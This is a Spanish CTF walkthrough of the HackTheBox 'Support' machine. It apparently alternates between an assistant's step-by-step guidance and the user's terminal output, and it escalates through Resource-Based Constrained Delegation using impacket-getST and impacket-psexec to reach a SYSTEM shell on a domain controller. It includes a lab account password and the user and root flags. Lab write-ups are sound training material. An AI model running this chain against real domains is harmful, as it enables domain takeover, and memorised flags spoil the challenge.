Tras una modificación en AD, el siguiente paso es una lectura de confirmación:

```text id="3g7oqi"
modificación
→ lectura del atributo
→ validación del efecto
```

answer

Hallazgo dominante actual:

```text id="yuy8fx"
RBCD configurado aparentemente, pendiente de verificación
```

Rama principal activa:

```text id="8jxhg8"
RBCD → verificación del atributo del DC
```

Siguiente paso único:

```text id="3tbe7u"
confirmar que DC permite delegación a R4M-SUP01$
```

commands

En Evil-WinRM:

```powershell id="sw5gps"
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount | Select-Object Name,PrincipalsAllowedToDelegateToAccount
```

checks

Interesa ver:

```text id="jd2eku"
PrincipalsAllowedToDelegateToAccount : {CN=R4M-SUP01,CN=Computers,DC=support,DC=htb}
```

writeup_notes

En el writeup conviene dejar claro que el comando de escritura no imprimió salida y que la validación se hizo consultando de nuevo el atributo del objeto `DC`.

## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount | Select-Object Name,PrincipalsAllowedToDelegateToAccount

Name PrincipalsAllowedToDelegateToAccount
---- ------------------------------------
DC   {CN=R4M-SUP01,CN=Computers,DC=support,DC=htb}

## objective

Usar la delegación RBCD ya configurada para solicitar un ticket Kerberos impersonando a `Administrator`.

verified_facts

* El atributo `PrincipalsAllowedToDelegateToAccount` del objeto `DC` ya contiene:

```text
CN=R4M-SUP01,CN=Computers,DC=support,DC=htb
```

* La cuenta de equipo controlada existe:

```text
R4M-SUP01$
```

* Su contraseña definida en el laboratorio es:

```text
R4mSup01Passw0rd!
```

* La configuración RBCD sobre `DC` está aplicada y verificada.
* El flujo documentado para esta máquina consiste en obtener un ticket Kerberos impersonando a `Administrator` contra el SPN `cifs/dc.support.htb`. 

assumptions

* La hora entre atacante y DC no está desfasada de forma problemática.
* `dc.support.htb` sigue resolviendo a `10.129.230.181`.
* Impacket está instalado en tu máquina atacante.

method

La cadena ahora es:

```text
R4M-SUP01$ autorizado sobre DC
→ S4U con la cuenta de equipo
→ ticket para Administrator
→ uso posterior con Impacket
```

answer

Hallazgo dominante actual:

```text
RBCD configurado correctamente sobre DC
```

Rama principal activa:

```text
RBCD → S4U → ticket Administrator
```

Siguiente paso único:

```text
solicitar ticket Kerberos para Administrator
```

commands

En una terminal local de Parrot, fuera de Evil-WinRM:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Support
impacket-getST -dc-ip 10.129.230.181 -spn cifs/dc.support.htb -impersonate Administrator 'support.htb/R4M-SUP01$:R4mSup01Passw0rd!'
```

checks

Interesa ver una salida indicando que se ha guardado un fichero `.ccache`, normalmente parecido a:

```text
Saving ticket in Administrator.ccache
```

writeup_notes

Punto documentable:

```text
RBCD permitió usar la cuenta de equipo controlada R4M-SUP01$ para solicitar un ticket de servicio CIFS hacia dc.support.htb impersonando a Administrator.
```
## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Support
impacket-getST -dc-ip 10.129.230.181 -spn cifs/dc.support.htb -impersonate Administrator 'support.htb/R4M-SUP01$:R4mSup01Passw0rd!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

## objective

Validar el ticket Kerberos obtenido y usarlo para abrir una shell administrativa en el DC.

verified_facts

* `impacket-getST` ha funcionado.
* Se ha obtenido TGT para la cuenta controlada `R4M-SUP01$`.
* Se ha ejecutado la cadena S4U:

  * `S4U2self`
  * `S4U2Proxy`
* Se ha impersonado a:

```text id="n0nqez"
Administrator
```

* Se ha guardado el ticket en:

```text id="ofyei8"
Administrator.ccache
```

assumptions

* `dc.support.htb` sigue resolviendo correctamente a `10.129.230.181`.
* El SPN usado fue `cifs/dc.support.htb`, por tanto el acceso debe hacerse contra `dc.support.htb`, no solo contra la IP.
* El siguiente uso correcto del ticket es con Impacket y Kerberos.

method

La cadena validada es:

```text id="hmevou"
RBCD configurado
→ getST
→ ticket Administrator.ccache
→ KRB5CCNAME
→ psexec Kerberos
```

answer

Hallazgo dominante actual:

```text id="tmz5ep"
ticket Kerberos de Administrator obtenido correctamente
```

Rama principal activa:

```text id="b8wpag"
ticket Administrator.ccache → shell administrativa
```

Siguiente paso único:

```text id="hvx4ga"
usar Administrator.ccache con psexec
```

commands

En tu terminal local de Parrot:

```bash id="83j8b1"
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
```

checks

Interesa confirmar que la shell indica algo equivalente a:

```text id="6oh70l"
nt authority\system
```

writeup_notes

Punto documentable:

```text id="f3acm5"
Tras configurar RBCD sobre el objeto DC, se usó la cuenta de equipo controlada para obtener un ticket CIFS impersonando a Administrator. El ticket se guardó como Administrator.ccache y se usó con Impacket mediante KRB5CCNAME para obtener shell administrativa.
```
## Ejecutamos:

*Evil-WinRM* PS C:\Users\support\Documents> KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
The term 'KRB5CCNAME=Administrator.ccache' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass support.h ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (KRB5CCNAME=Administrator.ccache:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

## objective

Corregir el contexto de ejecución y usar el ticket `Administrator.ccache` desde la máquina atacante.

verified_facts

* El ticket `Administrator.ccache` ya fue creado correctamente por `impacket-getST`.
* El comando falló porque se ejecutó dentro de **Evil-WinRM / PowerShell remoto**.
* `KRB5CCNAME=Administrator.ccache` es sintaxis de shell Linux, no de PowerShell.
* `impacket-psexec` debe ejecutarse desde tu **Parrot local**, donde está el `.ccache`.

assumptions

* `Administrator.ccache` está en:

```text
/home/r4mon/pentest/targets/HTB/easy/Support
```

method

La cadena correcta ahora es:

```text
ticket Administrator.ccache en Parrot
→ KRB5CCNAME apunta al ticket
→ impacket-psexec usa Kerberos
→ shell administrativa en DC
```

answer

No ejecutes ese comando dentro de Evil-WinRM. Déjala abierta si quieres, pero el siguiente paso va en una terminal local de Parrot.

commands

En una **terminal local de Parrot**:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Support
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass -dc-ip 10.129.230.181 support.htb/Administrator@dc.support.htb
```

checks

Interesa confirmar una shell con identidad equivalente a:

```text
nt authority\system
```

writeup_notes

Error operativo documentable:

```text
El ticket Kerberos se obtuvo correctamente en la máquina atacante, pero el primer intento de usarlo se lanzó dentro de PowerShell remoto. La variable KRB5CCNAME y las herramientas Impacket pertenecen al entorno Linux atacante, por lo que la ejecución correcta se hizo desde Parrot.
```
## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Support
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass -dc-ip 10.129.230.181 support.htb/Administrator@dc.support.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file BBmdYhom.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service Vfxw on dc.support.htb.....
[*] Starting service Vfxw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> help

 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 lput {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (ADMIN$)
 lget {file}                 - downloads pathname RELATIVE to the connected share (ADMIN$) to the current local dir
 ! {cmd}                    - executes a local shell cmd


C:\Windows\system32>

## objective

Confirmar shell administrativa y leer la **root flag**.

verified_facts

* `impacket-psexec` ha usado correctamente `Administrator.ccache`.
* Se ha encontrado `ADMIN$` escribible.
* Se ha creado y arrancado un servicio remoto.
* Ya tienes shell en:

```text
C:\Windows\system32>
```

assumptions

* La shell de `psexec` debería estar ejecutándose como `NT AUTHORITY\SYSTEM`.
* La root flag debería estar en el escritorio de `Administrator`.

method

Primero confirmamos identidad real y host. Después leemos la flag.

answer

Hallazgo dominante actual:

```text
ticket Administrator.ccache → psexec Kerberos → shell administrativa en DC
```

Siguiente paso único:

```text
confirmar SYSTEM y leer root.txt
```

commands

En la shell de `psexec`:

```cmd
whoami && hostname && type C:\Users\Administrator\Desktop\root.txt
```

checks

Interesa confirmar:

```text
nt authority\system
dc
```

Y después la cadena de la root flag.

writeup_notes

La cadena final queda:

```text
GenericAll sobre DC
→ MachineAccountQuota = 10
→ creación de R4M-SUP01$
→ configuración RBCD sobre DC
→ getST impersonando Administrator
→ Administrator.ccache
→ KRB5CCNAME
→ impacket-psexec
→ shell como SYSTEM
→ root flag
```
## Ejecutamos:



C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
dc

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
7fa548191c427443fb2d2dd0381450db


## objective

Cerrar la máquina **Support** con root conseguido y dejar la cadena técnica validada.

verified_facts

* Shell administrativa obtenida en el DC.
* Identidad confirmada:

```text
nt authority\system
```

* Host confirmado:

```text
dc
```

* Root flag obtenida:

```text
7fa548191c427443fb2d2dd0381450db
```

assumptions

* La máquina queda resuelta técnicamente.
* La vía de escalada final fue RBCD sobre el objeto `DC` usando la cuenta de equipo controlada `R4M-SUP01$`.

method

La cadena completa validada fue:

```text
SMB anónimo
→ support-tools
→ UserInfo.exe.zip
→ strings sobre binario .NET
→ credencial LDAP support\ldap
→ LDAP autenticado
→ atributo info del usuario support
→ WinRM como support
→ Shared Support Accounts
→ GenericAll sobre DC
→ MachineAccountQuota = 10
→ creación de R4M-SUP01$
→ configuración RBCD sobre DC
→ getST impersonando Administrator
→ Administrator.ccache
→ impacket-psexec
→ SYSTEM
```

answer

Máquina **Support** terminada.

```text
user flag: f6702c2f5fc70621f8bc10403281d32f
root flag: 7fa548191c427443fb2d2dd0381450db
```

Hallazgo dominante final:

```text
GenericAll sobre el objeto DC permitió configurar RBCD y obtener ejecución como SYSTEM.
```

commands

Sin comando nuevo necesario para avanzar.

checks

Validaciones finales completadas:

```text
whoami   → nt authority\system
hostname → dc
root.txt → leído correctamente
```

writeup_notes

Lección principal de Support:

```text
Una exposición SMB aparentemente menor entregó una herramienta interna .NET. El análisis del binario permitió recuperar credenciales LDAP, LDAP reveló una contraseña reutilizable en el campo info del usuario support, y ese foothold permitió descubrir una mala delegación de permisos en AD. La escalada no fue local, sino de dominio: GenericAll sobre el DC abrió la vía a Resource Based Constrained Delegation.
```
